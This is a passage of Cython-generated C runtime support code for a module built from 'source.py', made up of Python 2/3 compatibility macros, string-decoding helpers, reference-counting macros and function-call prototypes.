  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/

/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* decode_c_string_utf16.proto */
static CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16(const char *s, Py_ssize_t size, const char *errors) {
    int byteorder = 0;
    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);
}
static CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16LE(const char *s, Py_ssize_t size, const char *errors) {
    int byteorder = -1;
    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);
}
static CYTHON_INLINE PyObject *__Pyx_PyUnicode_DecodeUTF16BE(const char *s, Py_ssize_t size, const char *errors) {
    int byteorder = 1;
    return PyUnicode_DecodeUTF16(s, size, errors, &byteorder);
}

/* decode_c_bytes.proto */
static CYTHON_INLINE PyObject* __Pyx_decode_c_bytes(
         const char* cstring, Py_ssize_t length, Py_ssize_t start, Py_ssize_t stop,
         const char* encoding, const char* errors,
         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors));

/* decode_bytes.proto */
static CYTHON_INLINE PyObject* __Pyx_decode_bytes(
         PyObject* string, Py_ssize_t start, Py_ssize_t stop,
         const char* encoding, const char* errors,
         PyObject* (*decode_func)(const char *s, Py_ssize_t size, const char *errors)) {
    return __Pyx_decode_c_bytes(
        PyBytes_AS_STRING(string), PyBytes_GET_SIZE(string),
        start, stop, encoding, errors, decode_func);
}

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* GetItemInt.proto */
#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\
    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\
               __Pyx_GetItemInt_Generic(o, to_py_func(i))))
#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,
                                                     int is_list, int wraparound, int boundscheck);

/* SliceObject.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(
        PyObject* obj, Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** py_start, PyObject** py_stop, PyObject** py_slice,
        int has_cstart, int has_cstop, int wraparound);

/* PyObjectLookupSpecial.proto */
#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name) {
    PyObject *res;
    PyTypeObject *tp = Py_TYPE(obj);
#if PY_MAJOR_VERSION < 3
    if (unlikely(PyInstance_Check(obj)))
        return __Pyx_PyObject_GetAttrStr(obj, attr_name);
#endif
    res = _PyType_Lookup(tp, attr_name);
    if (likely(res)) {
        descrgetfunc f = Py_TYPE(res)->tp_descr_get;
        if (!f) {
            Py_INCREF(res);
        } else {
            res = f(res, obj, (PyObject *)tp);
        }
    } else {
        PyErr_SetObject(PyExc_AttributeError, attr_name);
    }
    return res;
}
#else
#define __Pyx_PyObject_LookupSpecial(o,n) __Pyx_PyObject_GetAttrStr(o,n)
#endif

/* PyObjectCallNoArg.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif

/* GetTopmostException.proto */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem * __Pyx_PyErr_GetTopmostException(PyThreadState *tstate);
#endif

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* SaveResetException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSave(type, value, tb)  __Pyx__ExceptionSave(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
